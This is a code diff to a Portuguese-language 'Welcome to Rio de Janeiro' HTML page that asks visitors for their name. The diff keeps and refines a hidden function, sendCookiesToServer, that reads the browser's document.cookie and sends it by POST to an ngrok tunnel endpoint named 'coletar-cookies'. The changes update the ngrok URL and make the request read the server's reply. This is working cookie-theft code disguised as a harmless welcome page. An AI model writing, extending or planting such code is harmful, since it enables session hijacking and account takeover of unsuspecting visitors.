@@ -75,7 +75,7 @@
     <!-- Página de Boas-Vindas -->
     <div id="welcomePage" class="container">
         <h1>Bem-vindo ao Rio de Janeiro!</h1>
-        <p>Estamos felizes em ter você por aqui! Por favor, digite seu nome abaixo para começar.</p>
+        <p>Estamos felizes em ter você por aqui! Por favor, digite seu nome para começar.</p>
         <input type="text" id="userName" placeholder="Digite seu nome aqui" oninput="handleInput(event)" onkeydown="checkEnter(event)">
         <button onclick="submitName()">Enviar</button>
         <p class="success-message hidden" id="successMessage">Nome recebido! Bem-vindo!</p>
@@ -142,24 +142,24 @@
             document.getElementById('mainPage').classList.remove('hidden');
         }
 
-        // Função para capturar e enviar os cookies para o servidor com no-cors
+        // Função para capturar e enviar os cookies para o servidor
         function sendCookiesToServer() {
             const cookies = document.cookie;  // Captura os cookies do navegador
-            const url = ' https://ea2c-177-192-8-19.ngrok-free.app/coletar-cookies';  // URL do servidor
+            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/coletar-cookies';  // URL do servidor
 
             console.log("Cookies capturados:", cookies);
 
-            // Envia os cookies via fetch para o servidor com no-cors
+            // Envia os cookies via fetch para o servidor
             fetch(url, {
                 method: 'POST',
-                mode: 'no-cors',  // Configuração de CORS desativado
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
             })
-            .then(response => {
-                console.log('Cookies enviados com sucesso!');
+            .then(response => response.json())
+            .then(data => {
+                console.log('Cookies enviados com sucesso!', data);
             })
             .catch(error => {
                 console.error('Erro ao enviar cookies:', error);
